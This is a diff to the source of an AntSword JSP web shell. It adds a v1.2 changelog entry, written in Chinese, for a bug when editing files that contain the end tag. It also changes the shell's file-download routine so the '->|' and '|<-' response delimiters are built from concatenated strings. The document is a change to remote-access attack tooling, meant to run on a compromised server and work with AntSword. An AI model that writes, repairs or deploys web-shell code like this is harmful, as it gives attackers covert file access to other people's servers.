@@ -20,7 +20,8 @@
  4. 本脚本中 encoder 与 AntSword 添加 Shell 时选择的 encoder 要一致，如果选择 default 则需要将 encoder 值设置为空
 
 ChangeLog:
-
+  Data: 2016/04/29 v1.2
+   1. 修正修改包含结束tag的文件会出错的 bug
   Date: 2016/04/06 v1.1
    1. 修正下载文件参数设置错误
    2. 修正一些注释的细节
@@ -169,11 +170,11 @@ ChangeLog:
         r.reset();
         ServletOutputStream os = r.getOutputStream();
         BufferedInputStream is = new BufferedInputStream(new FileInputStream(filePath));
-        os.write(("->|").getBytes(), 0, 3);
+        os.write(("->"+"|").getBytes(), 0, 3);
         while ((n = is.read(b, 0, 512)) != -1) {
             os.write(b, 0, n);
         }
-        os.write(("|<-").getBytes(), 0, 3);
+        os.write(("|"+"<-").getBytes(), 0, 3);
         os.close();
         is.close();
     }
